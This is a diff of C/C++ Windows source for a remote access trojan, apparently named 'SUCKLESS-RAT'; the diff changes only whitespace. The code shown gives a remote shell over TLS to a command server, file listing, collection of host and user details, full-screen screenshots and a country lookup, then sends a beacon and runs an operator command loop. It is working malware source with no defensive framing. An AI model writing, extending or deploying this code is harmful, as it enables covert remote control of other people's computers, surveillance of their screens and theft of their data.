@@ -4,14 +4,12 @@
 #include <windows.h>
 #include <wininet.h>
 #include <stdio.h>
-
 static const char kServer[] = "127.0.0.1:8443";
 static TlsCtx* g_tls = NULL;
 static volatile LONG g_run = 1;
 static volatile LONG g_bye = 0;
 static HANDLE g_hShellInW = NULL, g_hShellOutR = NULL, g_hShellProc = NULL;
 static CRITICAL_SECTION g_cs;
-
 static DWORD WINAPI ShellReader(LPVOID) {
   char buf[4096]; DWORD n; HANDLE out = g_hShellOutR;
   while (ReadFile(out, buf, sizeof(buf), &n, NULL)) {
@@ -21,7 +19,6 @@ static DWORD WINAPI ShellReader(LPVOID) {
   EnterCriticalSection(&g_cs); if (g_tls && g_run) TlsSendMsg(g_tls, C_SHELL_CLOSE, NULL, 0); LeaveCriticalSection(&g_cs);
   return 0;
 }
-
 static void ShellStart() {
   SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
   HANDLE inR, inW, outR, outW;
@@ -40,7 +37,6 @@ static void ShellStart() {
   CloseHandle(inR); CloseHandle(outW); CloseHandle(pi.hThread);
   CreateThread(NULL, 0, ShellReader, NULL, 0, NULL);
 }
-
 static void ShellStop() {
   if (g_hShellProc) { TerminateProcess(g_hShellProc, 0); CloseHandle(g_hShellProc); g_hShellProc = NULL; }
   if (g_hShellInW) { CloseHandle(g_hShellInW); g_hShellInW = NULL; }
@@ -55,7 +51,6 @@ static char* FsList(const char* path, uint32_t* outLen) {
     if (glob[len-1] != '\\' && glob[len-1] != '/') strcat(glob, "\\*");
     else strcat(glob, "*");
   }
-
   WIN32_FIND_DATAA fd;
   HANDLE h = FindFirstFileA(glob, &fd);
   if (h == INVALID_HANDLE_VALUE) {
@@ -81,7 +76,6 @@ static char* FsList(const char* path, uint32_t* outLen) {
   if (out) out[outSize] = 0;
   *outLen = (uint32_t)outSize; return out;
 }
-
 static char* SysInfo(uint32_t* outLen) {
   char host[256] = {0}, user[256] = {0}, dir[MAX_PATH] = {0};
   DWORD n = sizeof(host); GetComputerNameA(host, &n);
@@ -95,7 +89,6 @@ static char* SysInfo(uint32_t* outLen) {
     tot.QuadPart / (1024*1024*1024), fr.QuadPart / (1024*1024*1024), GetCurrentProcessId());
   *outLen = strlen(s); return s;
 }
-
 static char* Screenshot(uint32_t* outLen) {
   int vw = GetSystemMetrics(SM_CXVIRTUALSCREEN), vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
   int vx = GetSystemMetrics(SM_XVIRTUALSCREEN), vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
@@ -103,14 +96,12 @@ static char* Screenshot(uint32_t* outLen) {
   HBITMAP bm = CreateCompatibleBitmap(scr, vw, vh);
   SelectObject(mem, bm);
   BitBlt(mem, 0, 0, vw, vh, scr, vx, vy, SRCCOPY | CAPTUREBLT);
-
   BITMAPINFO bi = {0}; bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
   bi.bmiHeader.biWidth = vw; bi.bmiHeader.biHeight = vh;
   bi.bmiHeader.biPlanes = 1; bi.bmiHeader.biBitCount = 24; bi.bmiHeader.biCompression = BI_RGB;
   int rowBytes = ((vw * 3 + 3) & ~3); DWORD px = (DWORD)rowBytes * vh;
   BITMAPFILEHEADER fh = {0};
   fh.bfType = 'B' | ('M' << 8); fh.bfOffBits = sizeof(fh) + sizeof(BITMAPINFOHEADER); fh.bfSize = fh.bfOffBits + px;
-
   char* out = (char*)malloc(fh.bfSize);
   if (out) {
     memcpy(out, &fh, sizeof(fh)); memcpy(out + sizeof(fh), &bi.bmiHeader, sizeof(BITMAPINFOHEADER));
@@ -118,9 +109,7 @@ static char* Screenshot(uint32_t* outLen) {
   } else *outLen = 0;
   DeleteObject(bm); DeleteDC(mem); ReleaseDC(NULL, scr); return out;
 }
-
 static char g_country[64] = "?";
-
 static const char* WinName() {
   static char name[32];
   if (name[0]) return name;
@@ -134,7 +123,6 @@ static const char* WinName() {
                 : b >= 2600 ? "XP" : "";
   sprintf(name, "Windows%s%s", v[0] ? " " : "", v); return name;
 }
-
 static void FetchCountry() {
   HINTERNET h = InternetOpenA("SUCKLESS-RAT", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
   if (!h) return;
@@ -154,17 +142,14 @@ static void FetchCountry() {
   }
   InternetCloseHandle(h);
 }
-
 static DWORD WINAPI Worker(const char* addr) {
   char host[256] = {0}; int port = 8443;
   strncpy(host, addr, 255);
   char* colon = strchr(host, ':');
   if (colon) { *colon = 0; port = atoi(colon + 1); }
-
   struct addrinfo* ai = NULL;
   char portStr[16]; sprintf(portStr, "%d", port);
   if (getaddrinfo(host, portStr, NULL, &ai) != 0) return 0;
-
   SOCKET s = INVALID_SOCKET;
   for (auto p = ai; p; p = p->ai_next) {
     s = socket(p->ai_family, SOCK_STREAM, 0);
@@ -177,12 +162,10 @@ static DWORD WINAPI Worker(const char* addr) {
   InitTlsCtx(t, s);
   if (!TlsAcquire(t, NULL) || !TlsHandshake(t)) { free(t); closesocket(s); return 0; }
   EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);
-
   char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
   GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
   char hello[1024]; sprintf(hello, "%s|%s|%s|%s", hbuf, ubuf, WinName(), g_country);
   TlsSendMsg(t, C_HELLO, hello, strlen(hello));
-
   uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
   for (;;) {
     if (!TlsRecvMsg(t, &cmd, &pl, &plLen)) break;
@@ -211,7 +194,6 @@ done:
   closesocket(s); FreeTlsCtx(t); free(t);
   return 0;
 }
-
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
   InitializeCriticalSection(&g_cs);
   WSADATA w; WSAStartup(MAKEWORD(2, 2), &w);
